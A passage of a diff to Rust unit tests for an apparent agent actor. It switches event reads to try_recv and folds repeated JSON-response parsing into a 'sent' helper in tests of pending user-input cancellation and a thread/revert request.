-            let _ = events.recv().await.unwrap();
+            let _ = events.try_recv().unwrap();
             actor.settle_pending_user_inputs_on_shutdown().await;
 
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::UserInputResolved { ref request_id, ref answers }
                     if request_id == "86" && answers.is_empty()
             ));
-            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed response")
-            };
-            let response: Value = serde_json::from_str(&response).unwrap();
+            let response = sent(&mut actor).await;
             assert_eq!(response, json!({"id": 86, "result": {"action": "cancel"}}));
             assert!(actor.elicitations.is_empty());
 
@@ -7695,14 +7628,11 @@ mod tests {
             actor.settle_pending_user_inputs_on_shutdown().await;
 
             assert!(matches!(
-                events.recv().await.unwrap(),
+                events.try_recv().unwrap(),
                 AgentEvent::UserInputResolved { ref request_id, ref answers }
                     if request_id == "77" && answers.is_empty()
             ));
-            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
-                panic!("expected echoed response")
-            };
-            let response: Value = serde_json::from_str(&response).unwrap();
+            let response = sent(&mut actor).await;
             assert_eq!(response, json!({"id": 77, "result": {"answers": {}}}));
             assert!(actor.user_inputs.is_empty());
 
@@ -7860,10 +7790,7 @@ mod tests {
                     })
                     .await
                     .unwrap();
-                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
-                    panic!("expected echoed request")
-                };
-                let request: Value = serde_json::from_str(&request).unwrap();
+                let request = sent(actor).await;
                 assert_eq!(request["method"], "thread/revert");
                 assert_eq!(
                     request["params"],
